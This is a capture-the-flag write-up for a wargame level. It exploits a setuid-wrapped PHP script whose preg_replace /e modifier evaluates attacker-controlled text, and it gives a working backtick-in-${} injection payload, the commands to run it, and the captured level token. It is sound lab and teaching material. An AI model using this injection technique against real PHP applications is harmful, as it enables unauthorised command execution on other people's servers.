# level06

## Goal
Run `getflag` as `flag06` by abusing a PHP script.

## Recon
```sh
$ ls -l ~
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06        # SUID wrapper
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

`level06` is a small setuid ELF that does `setresuid/​setresgid(flag06)` then
`execve("/usr/bin/php", "/home/user/level06/level06.php", argv...)` - i.e. it runs the
PHP script **as flag06** with our argv. The script:

```php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);   // <-- /e modifier
  ...
}
$r = x($argv[1], $argv[2]); print $r;
```

`argv[1]` is a **filename** whose contents are processed. The `preg_replace` uses the
**`/e` modifier**, which evaluates the replacement `y("\2")` as PHP code, where `\2`
is whatever we put between `[x ` and `]`.

## Exploit
So the evaluated PHP is: `y("<our text>")`. We control `<our text>` but PHP's `/e`
runs `addslashes` on the capture, so **quotes and backslashes are escaped** - we can't
break out of the string. Two consequences:

- `[x ${system('getflag')}]` -> `y("${system(\'getflag\')}")` -> parse error (escaped quotes).
- `[x ${system(getflag)}]`   -> parse error: function calls are not allowed inside
  `${ }` string interpolation on this PHP.

The **backtick execution operator** is not escaped by `addslashes`, and a backtick
expression is a valid "variable name" expression inside `${ }`. Redirect getflag's
output to a file we can read:

```
[x ${`getflag > /tmp/l6_token`}]
```

Evaluated code becomes ``y("${`getflag > /tmp/l6_token`}")`` -> getflag runs as flag06,
its stdout is redirected to `/tmp/l6_token`.

```sh
$ printf '%s\n' '[x ${`getflag > /tmp/l6_token`}]' > /tmp/payload
$ ~/level06 /tmp/payload
$ cat /tmp/l6_token
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

## Result
- **level07 password (token):** `wiok45aaoguiboiki2tuin6ub`
